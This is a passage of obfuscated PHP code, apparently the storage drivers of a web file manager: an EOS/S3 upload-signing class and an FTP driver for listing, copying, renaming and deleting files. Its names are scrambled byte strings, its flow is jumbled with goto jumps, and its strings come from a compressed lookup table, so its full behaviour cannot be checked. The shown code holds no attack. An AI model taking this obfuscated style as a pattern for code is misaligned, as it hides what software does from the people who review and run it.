systemFolder($cö´ìßÅÚ±) { $E²ÃÍÓ¬Æ = IO_PATH_SYSTEM_SOURCE . $cö´ìßÅÚ±; $bÍ«”ÂË¨î = Cache::get($E²ÃÍÓ¬Æ); if (!$bÍ«”ÂË¨î) { $dêÚË¹ˆ¨˜ = IO::infoFull($E²ÃÍÓ¬Æ); if (!$dêÚË¹ˆ¨˜) { $bÍ«”ÂË¨î = IO::mkdir($E²ÃÍÓ¬Æ, REPEAT_SKIP); } else { $bÍ«”ÂË¨î = $dêÚË¹ˆ¨˜[$_SERVER[ç][75]]; } Cache::set($E²ÃÍÓ¬Æ, $bÍ«”ÂË¨î, 3600 * 10); } return $bÍ«”ÂË¨î; } public static function defaultDriver() { return Model($_SERVER[ç][709])->defaultDriver(); } public static function defaultIO() { $F·™£ğÔ =& $_SERVER[ç]; $d¸×´ë£‰Œ = self::defaultDriver(); return $F·™£ğÔ[1144] . $d¸×´ë£‰Œ[$F·™£ğÔ[388]] . $F·™£ğÔ[1133]; } public static function defaultDriverInit() { static $d¾ÂºèÄñ¶ = false; if ($d¾ÂºèÄñ¶) { return $d¾ÂºèÄñ¶; } $d¾ÂºèÄñ¶ = IO::init(self::defaultIO()); return $d¾ÂºèÄñ¶; } public static function fileTypeList() { $eƒˆ¨¤‡ =& $_SERVER[ç]; $déà¢‚ï·é = $GLOBALS[$eƒˆ¨¤‡[6]][$eƒˆ¨¤‡[1145]]; foreach ($déà¢‚ï·é as $Dİ¶ŠãÓÇŸ => $A‰‡ Ñ¼™») { $AÉ²º§¤ø— = $eƒˆ¨¤‡[1146] . $Dİ¶ŠãÓÇŸ; $d—­©°ƒÄº = LNG($AÉ²º§¤ø—); if ($AÉ²º§¤ø— != $d—­©°ƒÄº) { $déà¢‚ï·é[$Dİ¶ŠãÓÇŸ][$eƒˆ¨¤‡[28]] = $d—­©°ƒÄº; } } return $déà¢‚ï·é; } public static function transferType($cÓÔ×İ ßô, $bŞ¹ô¸çòÙ) { goto eŒğâñ¢¢ô; eŒğâñ¢¢ô: $E¦˜È±âÇµ =& $_SERVER[ç]; $AÜÉ—ˆ£’Î = self::driverType($cÓÔ×İ ßô); $c„ã’Öœ = self::driverType($bŞ¹ô¸çòÙ); goto E’‰ß¢ß¨; CÒÈß˜´±: return $E¦˜È±âÇµ[1149]; goto Fâì©ÜŒÚÓ; E’‰ß¢ß¨: if ($AÜÉ—ˆ£’Î[$E¦˜È±âÇµ[29]] == $c„ã’Öœ[$E¦˜È±âÇµ[29]] && $AÜÉ—ˆ£’Î[$E¦˜È±âÇµ[1147]] == $c„ã’Öœ[$E¦˜È±âÇµ[1147]]) { return $E¦˜È±âÇµ[1148]; } if ($AÜÉ—ˆ£’Î[$E¦˜È±âÇµ[29]] == $E¦˜È±âÇµ[801] && $c„ã’Öœ[$E¦˜È±âÇµ[29]] == $E¦˜È±âÇµ[105]) { return $E¦˜È±âÇµ[1061]; } if ($AÜÉ—ˆ£’Î[$E¦˜È±âÇµ[29]] == $E¦˜È±âÇµ[105] && $c„ã’Öœ[$E¦˜È±âÇµ[29]] == $E¦˜È±âÇµ[801]) { return $E¦˜È±âÇµ[106]; } goto CÒÈß˜´±; Fâì©ÜŒÚÓ: } public static function driverType($b¡çÇ¨£®Ú) { goto f³Òô£‡Ñ‘; f³Òô£‡Ñ‘: $eù°´ï´ =& $_SERVER[ç]; $fà®‚ Ÿ½Á = $b¡çÇ¨£®Ú->path; $F‘‚‘÷°Î = str_replace($eù°´ï´[1150], $eù°´ï´[33], strtolower($b¡çÇ¨£®Ú->getType())); goto Cê®ï×ÅÎ‹; CåÒÒ‰ô’â: return array($eù°´ï´[29] => $eù°´ï´[801], $eù°´ï´[1147] => $b¡çÇ¨£®Ú->pathDriver, $eù°´ï´[75] => $fà®‚ Ÿ½Á); goto c·ó±óæ¤; Cê®ï×ÅÎ‹: if ($F‘‚‘÷°Î == $eù°´ï´[700] || $F‘‚‘÷°Î == $eù°´ï´[1151] || $F‘‚‘÷°Î == $eù°´ï´[1152]) { $b¡çÇ¨£®Ú = self::defaultDriverInit(); } else { if ($F‘‚‘÷°Î == $eù°´ï´[1068] || $F‘‚‘÷°Î == $eù°´ï´[1153]) { $b¡çÇ¨£®Ú = IO::init($b¡çÇ¨£®Ú->pathParse[$eù°´ï´[1015]]); } } $F‘‚‘÷°Î = str_replace($eù°´ï´[1150], $eù°´ï´[33], strtolower($b¡çÇ¨£®Ú->getType())); if ($F‘‚‘÷°Î == $eù°´ï´[105]) { return array($eù°´ï´[29] => $eù°´ï´[105], $eù°´ï´[1147] => $eù°´ï´[33], $eù°´ï´[75] => $fà®‚ Ÿ½Á); } goto CåÒÒ‰ô’â; c·ó±óæ¤: } } goto B„ØŠùèŞÜ; Bë×â‹õ»—: $E…ËÓ‡½™§ = $_SERVER[ç][569]; while ($E…ËÓ‡½™§ < $_SERVER[ç][570]) { if ($E…ËÓ‡½™§ >= 0) { break; } $E…ËÓ‡½™§++; } $_SERVER[øÆ] = explode($_SERVER[ç][571], gzinflate(substr($_SERVER[ç][572], 10, -8))); goto B£Ø¶«ÆÑƒ; A¼é…ÀâÇ: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($f­´Â¼Ë’) { parent::__construct($f­´Â¼Ë’); $this->signatureVersion($_SERVER[ç][210]); } public function uploadFormData($FŒ—Ãç¦‡, $Aø²«àÇÀĞ = 3600) { goto bŒä½è²‘¡; E¶Â½íÕÒÑ: $D—Èèƒ‰Ã = array($this->accessKey, $F±Ÿ»³È¶æ, $this->region, $Cî“›«‡Û÷, $eï»‰‚ÅŒ); $b°Ûğ†‚Àµ = implode($d«µ÷Ç¿å[8], $D—Èèƒ‰Ã); $CŸìõ›ò–  = array($d«µ÷Ç¿å[1156] => gmdate($d«µ÷Ç¿å[1155], strtotime($d«µ÷Ç¿å[1191])), $d«µ÷Ç¿å[1157] => array(array($d«µ÷Ç¿å[1159] => $this->bucket), array($d«µ÷Ç¿å[1158] => $Fˆ££ï‘ÔŒ), array($d«µ÷Ç¿å[1160], $d«µ÷Ç¿å[1161], $d«µ÷Ç¿å[33]), array($d«µ÷Ç¿å[1160], $d«µ÷Ç¿å[1192], $d«µ÷Ç¿å[33]), array($d«µ÷Ç¿å[1160], $d«µ÷Ç¿å[1193], $d«µ÷Ç¿å[33]), array($d«µ÷Ç¿å[1162] => $aÆ‡Á®˜œ), array($d«µ÷Ç¿å[1194] => $b°Ûğ†‚Àµ), array($d«µ÷Ç¿å[1195] => $FÍÙ«…ÆÖê), array($d«µ÷Ç¿å[1196] => $F„Ù˜òÜÀÎ), array($d«µ÷Ç¿å[1197] => $CÀˆ”Ä))); goto a†ôÑ»ë•à; bŒä½è²‘¡: $d«µ÷Ç¿å =& $_SERVER[ç]; $Fˆ££ï‘ÔŒ = $d«µ÷Ç¿å[191]; $FÍÙ«…ÆÖê = $d«µ÷Ç¿å[1188]; goto Eòè˜¡»Á; f÷©áƒ‰Ï: $c£À£¾„È„ = array($d«µ÷Ç¿å[209] => $d«µ÷Ç¿å[33], $d«µ÷Ç¿å[1200] => $d«µ÷Ç¿å[33], $d«µ÷Ç¿å[1158] => $Fˆ££ï‘ÔŒ, $d«µ÷Ç¿å[1162] => $aÆ‡Á®˜œ, $d«µ÷Ç¿å[1166] => $dø×´‘Éƒ , $d«µ÷Ç¿å[1201] => $b°Ûğ†‚Àµ, $d«µ÷Ç¿å[1202] => $FÍÙ«…ÆÖê, $d«µ÷Ç¿å[1203] => $F„Ù˜òÜÀÎ, $d«µ÷Ç¿å[1204] => $CÀˆ”Ä, $d«µ÷Ç¿å[1205] => $fÖÃ©­˜Ñ, $d«µ÷Ç¿å[175] => $this->getHost()); return $c£À£¾„È„; goto AÖ…í´; a†ôÑ»ë•à: $dø×´‘Éƒ  = base64_encode(json_encode($CŸìõ›ò– )); $A¯ÎÅî­¯ = hash_hmac($d«µ÷Ç¿å[1198], $F±Ÿ»³È¶æ, $d«µ÷Ç¿å[1199] . $this->secret, !0); $bÌç‚ßáŒİ = hash_hmac($d«µ÷Ç¿å[1198], $this->region, $A¯ÎÅî­¯, !0); goto b‹£½£´©•; b‹£½£´©•: $Fˆ½±ŒÂ¾À = hash_hmac($d«µ÷Ç¿å[1198], $Cî“›«‡Û÷, $bÌç‚ßáŒİ, !0); $c¹¢ºï‹× = hash_hmac($d«µ÷Ç¿å[1198], $eï»‰‚ÅŒ, $Fˆ½±ŒÂ¾À, !0); $fÖÃ©­˜Ñ = hash_hmac($d«µ÷Ç¿å[1198], $dø×´‘Éƒ , $c¹¢ºï‹×); goto f÷©áƒ‰Ï; Eòè˜¡»Á: $Cî“›«‡Û÷ = $d«µ÷Ç¿å[59]; $F„Ù˜òÜÀÎ = gmdate($d«µ÷Ç¿å[1189]); $F±Ÿ»³È¶æ = gmdate($d«µ÷Ç¿å[696]); goto F ñ¤É‘í; F ñ¤É‘í: $eï»‰‚ÅŒ = $d«µ÷Ç¿å[1190]; $CÀˆ”Ä = $Aø²«àÇÀĞ . $d«µ÷Ç¿å[33]; $aÆ‡Á®˜œ = $d«µ÷Ç¿å[1154]; goto E¶Â½íÕÒÑ; AÖ…í´: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($fÂÖº‰¶õ) { parent::__construct(); if (count($fÂÖº‰¶õ) > 0) { $this->_init($fÂÖº‰¶õ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Cğ›†ª¯Š‡) { $b¬ÓÈñ…ß =& $_SERVER[ç]; global $config; $this->appCharset = $config[$b¬ÓÈñ…ß[1206]]; $this->systemCharset = $config[$b¬ÓÈñ…ß[1207]]; if (isset($Cğ›†ª¯Š‡[$b¬ÓÈñ…ß[1208]]) && $Cğ›†ª¯Š‡[$b¬ÓÈñ…ß[1208]]) { $this->systemCharset = $Cğ›†ª¯Š‡[$b¬ÓÈñ…ß[1208]]; } } public function iconvApp($f»†ÓÖç“Ó) { return $this->iconvTo($f»†ÓÖç“Ó, $this->systemCharset, $this->appCharset); } public function iconvSystem($aêÜãÚ…”) { return $this->iconvTo($aêÜãÚ…”, $this->appCharset, $this->systemCharset); } public function getPathOuter($bÓ“Ï‰«ôª) { goto bÕçÀ–›®°; D™Ã—Ç†Ã: return $this->pathDriver . $cÖË¯ôç¢á[8] . ltrim($bÓ“Ï‰«ôª, $cÖË¯ôç¢á[8]); goto C„¶ø÷Ó; bÕçÀ–›®°: $cÖË¯ôç¢á =& $_SERVER[ç]; $B„–ö¼‘¸ñ = $this->iconvApp($this->pathBase); $bÓ“Ï‰«ôª = $this->iconvApp($bÓ“Ï‰«ôª); goto f²Ÿó¯ÍéÌ; c¥ÎÜ›‰ø: $bÓ“Ï‰«ôª = KodIO::clear($bÓ“Ï‰«ôª); $bÓ“Ï‰«ôª = substr($bÓ“Ï‰«ôª, strlen($B„–ö¼‘¸ñ)); if (empty($this->pathDriver)) { return $bÓ“Ï‰«ôª; } goto D™Ã—Ç†Ã; f²Ÿó¯ÍéÌ: if (substr($B„–ö¼‘¸ñ, 0, 2) == $cÖË¯ôç¢á[1209]) { $B„–ö¼‘¸ñ = BASIC_PATH . substr($B„–ö¼‘¸ñ, 2); } if (substr($bÓ“Ï‰«ôª, 0, 2) == $cÖË¯ôç¢á[1209]) { $bÓ“Ï‰«ôª = BASIC_PATH . substr($bÓ“Ï‰«ôª, 2); } $B„–ö¼‘¸ñ = KodIO::clear($B„–ö¼‘¸ñ); goto c¥ÎÜ›‰ø; C„¶ø÷Ó: } private function _init($bŞ¿´Ù‡¹à = array()) { $aÁ²£Ã®ìÖ =& $_SERVER[ç]; if (!function_exists($aÁ²£Ã®ìÖ[1210])) { throw new Exception(LNG($aÁ²£Ã®ìÖ[1211])); } $this->config = $bŞ¿´Ù‡¹à; $this->charsetReset($bŞ¿´Ù‡¹à); foreach ($bŞ¿´Ù‡¹à as $aíªÕæ›È¦ => $BºáŞ–ç†Û) { if (isset($this->{$aíªÕæ›È¦})) { $this->{$aíªÕæ›È¦} = $BºáŞ–ç†Û; } } return $this->_login($bŞ¿´Ù‡¹à); } private function _login($d³­»»İßê) { goto d¯…šÀ¿Ş; d¯…šÀ¿Ş: $BŒ†ìæêï½ =& $_SERVER[ç]; static $cõŞ´Ş”· = array(); $FšÊÉ¸ùÜ† = md5(json_encode($d³­»»İßê)); goto bÕñîç£Ú; eÚó²ñÂÍ“: $cõŞ´Ş”·[$FšÊÉ¸ùÜ†] = array($BŒ†ìæêï½[1215] => $this->connect, $BŒ†ìæêï½[175] => $this->host, $BŒ†ìæêï½[174] => $this->scheme, $BŒ†ìæêï½[176] => $this->port); return $F×É’‚®Á×; goto Fè‚½Ø•; bÕñîç£Ú: if (isset($cõŞ´Ş”·[$FšÊÉ¸ùÜ†])) { foreach ($cõŞ´Ş”·[$FšÊÉ¸ùÜ†] as $CÔ‚öç¾± => $DÛ…™¥Ş›Û) { $this->{$CÔ‚öç¾±} = $DÛ…™¥Ş›Û; } return !0; } $a–—±À¥Ø¿ = parse_url(trim($this->server, $BŒ†ìæêï½[8])); $this->host = $a–—±À¥Ø¿[$BŒ†ìæêï½[175]]; goto C²Äø¡ˆøä; C²Äø¡ˆøä: $C˜õïâùñ = isset($a–—±À¥Ø¿[$BŒ†ìæêï½[174]]) && $a–—±À¥Ø¿[$BŒ†ìæêï½[174]] == $BŒ†ìæêï½[1212] ? !0 : !1; $this->scheme = $C˜õïâùñ ? $BŒ†ìæêï½[1213] : $BŒ†ìæêï½[1214]; $this->port = isset($a–—±À¥Ø¿[$BŒ†ìæêï½[176]]) ? $a–—±À¥Ø¿[$BŒ†ìæêï½[176]] : 21; goto c÷…£‡¯Š; c÷…£‡¯Š: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $F×É’‚®Á× = @ftp_login($this->connect, $this->username, $this->userpass); goto eˆéâÆ¾; eˆéâÆ¾: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $b²ì® ¹øÖ = $this->pasv == $BŒ†ìæêï½[86] ? !0 : !1; @ftp_pasv($this->connect, $b²ì® ¹øÖ); goto eÚó²ñÂÍ“; Fè‚½Ø•: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($B£ëÙ«×‘ß, $d÷ì¾±Ôæë = '', $dˆ÷îÅèñ· = REPEAT_RENAME) { if ($this->setContent($B£ëÙ«×‘ß, $d÷ì¾±Ôæë)) { return $this->getPathOuter($B£ëÙ«×‘ß); } return !1; } public function mkdir($aê–ĞëÆã, $DÙ×ƒïÕáÀ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $aê–ĞëÆã = $this->iconvSystem($aê–ĞëÆã); if ($this->_isFolder($aê–ĞëÆã) || @ftp_mkdir($this->connect, $aê–ĞëÆã)) { return $this->getPathOuter($aê–ĞëÆã); } if (!$this->mkdir($this->pathFather($aê–ĞëÆã))) { return !1; } if ($aê–ĞëÆã = @ftp_mkdir($this->connect, $aê–ĞëÆã)) { return $this->getPathOuter($aê–ĞëÆã); } return !1; } public function copyFile($DÊ“„ù¿ô–, $D—ö‚¶¬Ù”) { goto dŞ©ŠÓÃ; aÓÅ†Î±: $f«© »áè = $this->iconvApp($a‘Ş×˜¨Á); $this->download($DÊ“„ù¿ô–, $f«© »áè); $føÀØ¸„Ş = $this->upload($D—ö‚¶¬Ù”, $f«© »áè); goto AÍ¼¯§êšµ; dŞ©ŠÓÃ: if (!$this->_isconn()) { return !1; } $e¥·ÁŸË… = $this->pathThis($this->iconvSystem($DÊ“„ù¿ô–)); $a‘Ş×˜¨Á = $this->tempFile($e¥·ÁŸË…); goto aÓÅ†Î±; AÍ¼¯§êšµ: $this->tempFileRemve($a‘Ş×˜¨Á); return $føÀØ¸„Ş; goto BÜ ‹ÒŠ; BÜ ‹ÒŠ: } public function moveFile($fƒ÷Ï­ƒ–Â, $B·ƒ¸…Æ»ï) { if (!$this->_isconn()) { return !1; } $fƒ÷Ï­ƒ–Â = $this->iconvSystem($fƒ÷Ï­ƒ–Â); $B·ƒ¸…Æ»ï = $this->iconvSystem($B·ƒ¸…Æ»ï); $A¨§Ç¹²¬§ = @ftp_rename($this->connect, $fƒ÷Ï­ƒ–Â, $B·ƒ¸…Æ»ï); return $A¨§Ç¹²¬§ ? $this->getPathOuter($B·ƒ¸…Æ»ï) : !1; } public function delFile($bßí˜äŸ±•) { if (!$this->_isconn()) { return !1; } $bßí˜äŸ±• = $this->iconvSystem($bßí˜äŸ±•); return @ftp_delete($this->connect, $bßí˜äŸ±•); } public function delFolder($aĞñ£›Àºä) { goto b–÷¦„áö; c†“‰¦á¨¨: foreach ($AÃà­²´Çò as $c°ë ºœ÷½) { $c°ë ºœ÷½ = $this->iconvSystem($c°ë ºœ÷½); $b½¢íÎ™–± = @ftp_rmdir($this->connect, $c°ë ºœ÷½); if (!$b½¢íÎ™–±) { return !1; } } $aĞñ£›Àºä = $this->iconvSystem($aĞñ£›Àºä); return @ftp_rmdir($this->connect, $aĞñ£›Àºä); goto c¡½Œ½˜¯; b–÷¦„áö: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $AÃà­²´Çò = $EË…‘¦®ì = array(); goto E¯ßĞòöË¾; E¯ßĞòöË¾: $this->fileList($aĞñ£›Àºä, $AÃà­²´Çò, $EË…‘¦®ì, !0); $this->listItemCache = !0; foreach ($EË…‘¦®ì as $eäÁ¶Ùİ†ï) { $c°ë ºœ÷½ = $this->iconvSystem($eäÁ¶Ùİ†ï[$_SERVER[ç][28]]); $b½¢íÎ™–± = @ftp_delete($this->connect, $c°ë ºœ÷½); if (!$b½¢íÎ™–±) { return !1; } } goto c†“‰¦á¨¨; c¡½Œ½˜¯: } public function rename($a¶ğ·º‹ªñ, $C²Ü·¡³í) { goto AŞîÈƒ˜Ø›; aÙ÷«Æ·”Ì: $Eá ãŒ×•À = rtrim($B¨ØÁğ²ï×, $C¦Œµ‘Ê—Î[8]) . $C¦Œµ‘Ê—Î[8] . $eÊ“ĞáÒ; $BöÀ‚‘‡ = @ftp_rename($this->connect, $a¶ğ·º‹ªñ, $Eá ãŒ×•À); $Eá ãŒ×•À = $this->iconvApp($Eá ãŒ×•À); goto dÎİŞ¦îê; a¶òĞ«è¬æ: $eÊ“ĞáÒ = $this->iconvSystem($eÊ“ĞáÒ); $a¶ğ·º‹ªñ = $this->iconvSystem($a¶ğ·º‹ªñ); $B¨ØÁğ²ï× = $this->pathFather($a¶ğ·º‹ªñ); goto aÙ÷«Æ·”Ì; dÎİŞ¦îê: return $BöÀ‚‘‡ ? $this->getPathOuter($Eá ãŒ×•À) : !1; goto Aå‘’÷•¶İ; AŞîÈƒ˜Ø›: $C¦Œµ‘Ê—Î =& $_SERVER[ç]; if (!$this->_isconn()) { return !1; } $eÊ“ĞáÒ = $this->fileNameAuto($this->pathFather($a¶ğ·º‹ªñ), $C²Ü·¡³í); goto a¶òĞ«è¬æ; Aå‘’÷•¶İ: } private function folderInfo($CóŒÔ…µ‰é, $E¶æöÙ‰ë = false) { $CİÓïõÛÎ =& $_SERVER[ç]; $E•ä‰Ï†–È = array($CİÓïõÛÎ[28] => $this->pathThis($CóŒÔ…µ‰é), $CİÓïõÛÎ[75] => $this->getPathOuter($CİÓïõÛÎ[8] . $CóŒÔ…µ‰é), $CİÓïõÛÎ[29] => $CİÓïõÛÎ[76]); if ($E¶æöÙ‰ë) { return $E•ä‰Ï†–È; } $E•ä‰Ï†–È[$CİÓïõÛÎ[192]] = $E•ä‰Ï†–È[$CİÓïõÛÎ[83]] = 0; $E•ä‰Ï†–È[$CİÓïõÛÎ[193]] = $E•ä‰Ï†–È[$CİÓïõÛÎ[194]] = !0; return $E•ä‰Ï†–È; } private function fileInfo($a¦°¬°¥ò, $F’Åí†Ñ‘¥ = false, $AËÕ…ÎÑƒ‘ = array()) { goto eÜ“±ê†ñ…; Fò–öçãë¨: $BÖÓ‡‡À[$d°Ş‹‰‰³ö[192]] = $BÖÓ‡‡À[$d°Ş‹‰‰³ö[83]] = 0; $BÖÓ‡‡À[$d°Ş‹‰‰³ö[193]] = $BÖÓ‡‡À[$d°Ş‹‰‰³ö[194]] = !0; $C¢Îµè¶‚Ğ = $this->iconvSystem($a¦°¬°¥ò); goto FÂØ²°ñÁÛ; FÂØ²°ñÁÛ: $BÖÓ‡‡À[$d°Ş‹‰‰³ö[83]] = @ftp_mdtm($this->connect, $C¢Îµè¶‚Ğ); if (empty($AËÕ…ÎÑƒ‘)) { $AËÕ…ÎÑƒ‘ = $this->objectMeta($a¦°¬°¥ò); if (!$AËÕ…ÎÑƒ‘) { return $BÖÓ‡‡À; } } $BÖÓ‡‡À[$d°Ş‹‰‰³ö[77]] = $AËÕ…ÎÑƒ‘[$d°Ş‹‰‰³ö[77]]; goto fäÏÛñèîŠ; fäÏÛñèîŠ: return $BÖÓ‡‡À; goto dŒ„ ğÍğ; eÜ“±ê†ñ…: $d°Ş‹‰‰³ö =& $_SERVER[ç]; $BÖÓ‡‡À = array($d°Ş‹‰‰³ö[28] => $this->pathThis($a¦°¬°¥ò), $d°Ş‹‰‰³ö[75] => $this->getPathOuter($d°Ş‹‰‰³ö[8] . $a¦°¬°¥ò), $d°Ş‹‰‰³ö[29] => $d°Ş‹‰‰³ö[173], $d°Ş‹‰‰³ö[77] => isset($AËÕ…ÎÑƒ‘[$d°Ş‹‰‰³ö[77]]) ? $AËÕ…ÎÑƒ‘[$d°Ş‹‰‰³ö[77]] : 0, $d°Ş‹‰‰³ö[167] => $this->ext($a¦°¬°¥ò)); if ($F’Åí†Ñ‘¥) { return $BÖÓ‡‡À; } goto Fò–öçãë¨; dŒ„ ğÍğ: } public function size($C¸«ŞÜŠ¿) { $c¼Ñö•¤ = $this->objectMeta($C¸«ŞÜŠ¿); return $c¼Ñö•¤ ? $c¼Ñö•¤[$_SERVER[ç][77]] : 0; } public function info($A³§ÌÄ—ãÈ) { if ($this->isFile($A³§ÌÄ—ãÈ)) { return $this->fileInfo($A³§ÌÄ—ãÈ, 0); } else { if ($this->isFolder($A³§ÌÄ—ãÈ)) { return $this->folderInfo($A³§ÌÄ—ãÈ); } } return !1; } private function fileList($bÕÙ…„ÊÈ‚, &$Bë·™ÈÆÔ¥, &$FÄÛËÎÇ², $bÏÏ´œ‚ªô = false) { goto Eš²Ò°¸»; C‘¹†˜¿¥Ù: @ftp_chdir($this->connect, $fÁ£¢ß…Ò½[8]); $bÕÙ…„ÊÈ‚ = rtrim($bÕÙ…„ÊÈ‚, $fÁ£¢ß…Ò½[8]) . $fÁ£¢ß…Ò½[8]; check_abort(); goto eå¸ó¿Øãç; Bğƒ¿‚å‘: $Cğ‚ÚÀ»‹ = array($fÁ£¢ß…Ò½[94] => 1, $fÁ£¢ß…Ò½[1216] => 1); foreach ($eá·²ÅŒ‘˜ as $C™ËõâÓö) { goto AÉæİØôÅ; d‰ŞòçÖÀ: if (!$bóÜ¤ˆ•¡® || isset($Cğ‚ÚÀ»‹[$bóÜ¤ˆ•¡®])) { continue; } $bóÜ¤ˆ•¡® = $this->iconvApp($bÕÙ…„ÊÈ‚ . ltrim($bóÜ¤ˆ•¡®, $fÁ£¢ß…Ò½[8])); $FˆÎ‡¦¥¿Ä = array($fÁ£¢ß…Ò½[28] => $bóÜ¤ˆ•¡®, $fÁ£¢ß…Ò½[29] => $fÁ£¢ß…Ò½[173], $fÁ£¢ß…Ò½[77] => $còˆÌØ»«ë[4]); goto b˜¸’Ù¯¡”; b˜¸’Ù¯¡”: if (substr($C™ËõâÓö, 0, 1) == $fÁ£¢ß…Ò½[1217]) { $FˆÎ‡¦¥¿Ä[$fÁ£¢ß…Ò½[29]] = $fÁ£¢ß…Ò½[76]; $FˆÎ‡¦¥¿Ä[$fÁ£¢ß…Ò½[77]] = 0; } $fÉÒ½™–±® = $FˆÎ‡¦¥¿Ä[$fÁ£¢ß…Ò½[29]] == $fÁ£¢ß…Ò½[76] ? !0 : !1; if ($aÌäá¾éí) { $this->cacheMethod($fÁ£¢ß…Ò½[197], $bóÜ¤ˆ•¡®, $fÉÒ½™–±®); $this->cacheMethod($fÁ£¢ß…Ò½[198], $bóÜ¤ˆ•¡®, $FˆÎ‡¦¥¿Ä); } goto A³ Í®ÆØ†; A³ Í®ÆØ†: if ($fÉÒ½™–±®) { $Bë·™ÈÆÔ¥[] = $bóÜ¤ˆ•¡®; if ($bÏÏ´œ‚ªô) { $this->fileList($bóÜ¤ˆ•¡®, $Bë·™ÈÆÔ¥, $FÄÛËÎÇ², $bÏÏ´œ‚ªô); } continue; } $FÄÛËÎÇ²[] = $FˆÎ‡¦¥¿Ä; goto a¾ùçĞ§¸Ñ; AÉæİØôÅ: $còˆÌØ»«ë = $this->_listItem($C™ËõâÓö); if ($còˆÌØ»«ë[0] == $fÁ£¢ß…Ò½[701]) { continue; } $bóÜ¤ˆ•¡® = $còˆÌØ»«ë[8]; goto d‰ŞòçÖÀ; a¾ùçĞ§¸Ñ: } if ($aÌäá¾éí) { $this->cacheMethod($fÁ£¢ß…Ò½[197], $bÕÙ…„ÊÈ‚, !0); } goto eïô™ÔŸ ; eå¸ó¿Øãç: $aÌäá¾éí = $this->listItemCache === !1 ? !1 : !0; $eá·²ÅŒ‘˜ = @ftp_rawlist($this->connect, $bÕÙ…„ÊÈ‚); if (!$eá·²ÅŒ‘˜) { $eá·²ÅŒ‘˜ = array(); } goto Bğƒ¿‚å‘; Eš²Ò°¸»: $fÁ£¢ß…Ò½ =& $_SERVER[ç]; $bÕÙ…„ÊÈ‚ = $this->iconvSystem($bÕÙ…„ÊÈ‚); if (!$this->isFolder($bÕÙ…„ÊÈ‚)) { return !1; } goto C‘¹†˜¿¥Ù; eïô™ÔŸ : } private function _listItem($Bº‹‹ÁÇ) { if (empty($Bº‹‹ÁÇ)) { return array(); } $c‚‹«Öµ’ = preg_split($_SERVER[ç][1218], $Bº‹‹ÁÇ); if (count($c‚‹«Öµ’) <= 9) { return $c‚‹«Öµ’; } $c‚‹«Öµ’[8] = trim(substr($Bº‹‹ÁÇ, strpos($Bº‹‹ÁÇ, $c‚‹«Öµ’[7]) + strlen($c‚‹«Öµ’[7]))); return array_splice($c‚‹«Öµ’, 0, 9); } public function listPath($Fèõ²œÈíÍ, $B±èÌ”Ôœ¤ = false) { goto CË¼âÓˆ¢‹; C—Ã½æËæ: return array($D£ŸÄÔÇïª[74] => $bÃßÅêÄ·Ò, $D£ŸÄÔÇïª[73] => $có†À¸Ñø­); goto b‹µ÷¯¥öŞ; CË¼âÓˆ¢‹: $D£ŸÄÔÇïª =& $_SERVER[ç]; if (!$this->_isconn()) { return !1; } $bÃßÅêÄ·Ò = $có†À¸Ñø­ = array(); goto CŠˆ¿×Êã; CŠˆ¿×Êã: $this->fileList($Fèõ²œÈíÍ, $bÃßÅêÄ·Ò, $có†À¸Ñø­); foreach ($bÃßÅêÄ·Ò as $E°–è——˜Î => $e´¤©Ìâæ¶) { $bÃßÅêÄ·Ò[$E°–è——˜Î] = $this->folderInfo($e´¤©Ìâæ¶, $B±èÌ”Ôœ¤); } foreach ($có†À¸Ñø­ as $E°–è——˜Î => $e´¤©Ìâæ¶) { $có†À¸Ñø­[$E°–è——˜Î] = $this->fileInfo($e´¤©Ìâæ¶[$D£ŸÄÔÇïª[28]], $B±èÌ”Ôœ¤, $e´¤©Ìâæ¶); } goto C—Ã½æËæ; b‹µ÷¯¥öŞ: } public function has($c×Ö»ÜßŸÍ, $E…®•»‘Ëİ = false, $BœõÏ¶æ§™ = true) { goto däŒŸˆ©­Ï; dÅïŠ…İ¯: return !1; goto AßÍÁË†»ñ; dŠóâÚ»¸—: $this->fileList($c×Ö»ÜßŸÍ, $f¯ùÕ“ÀßÉ, $DÎ¼«ª™µØ, $fŠ¤İÉ®’š); if ($E…®•»‘Ëİ) { return array($cãö©øÉç˜[201] => count($DÎ¼«ª™µØ), $cãö©øÉç˜[202] => count($f¯ùÕ“ÀßÉ)); } if ($BœõÏ¶æ§™) { if (count($DÎ¼«ª™µØ)) { return !0; } } else { if (count($f¯ùÕ“ÀßÉ)) { return !0; } } goto dÅïŠ…İ¯; däŒŸˆ©­Ï: $cãö©øÉç˜ =& $_SERVER[ç]; $f¯ùÕ“ÀßÉ = $DÎ¼«ª™µØ = array(); $fŠ¤İÉ®’š = $E…®•»‘Ëİ ? !0 : !1; goto dŠóâÚ»¸—; AßÍÁË†»ñ: } public function listAll($cÕè”ªÙ) { goto a ƒêÛÀçï; Böˆ¾¼æ¨Ş: foreach ($D®‰Ø¡¡Ÿá as $DÚƒÆŒÜŠ²) { if (is_string($DÚƒÆŒÜŠ²)) { $b†Ìİ¼ª›[$DÚƒÆŒÜŠ²] = 0; } } return $this->listAllFiles($cÕè”ªÙ, array_keys($b†Ìİ¼ª›), $b†Ìİ¼ª›); goto d»ëÓ¹ò±«; c‚­‘‡îğ: $this->fileList($cÕè”ªÙ, $D®‰Ø¡¡Ÿá, $E¤ƒ–½¡³, !0); $b†Ìİ¼ª› = array(); foreach ($E¤ƒ–½¡³ as $DÚƒÆŒÜŠ²) { $b†Ìİ¼ª›[$DÚƒÆŒÜŠ²[$bÙ±’Ğ›•[28]]] = $DÚƒÆŒÜŠ²[$bÙ±’Ğ›•[77]]; } goto Böˆ¾¼æ¨Ş; a ƒêÛÀçï: $bÙ±’Ğ›• =& $_SERVER[ç]; if (!$this->_isconn()) { return !1; } $D®‰Ø¡¡Ÿá = $E¤ƒ–½¡³ = array(); goto c‚­‘‡îğ; d»ëÓ¹ò±«: } public function getContent($E¢àâò­†©) { if 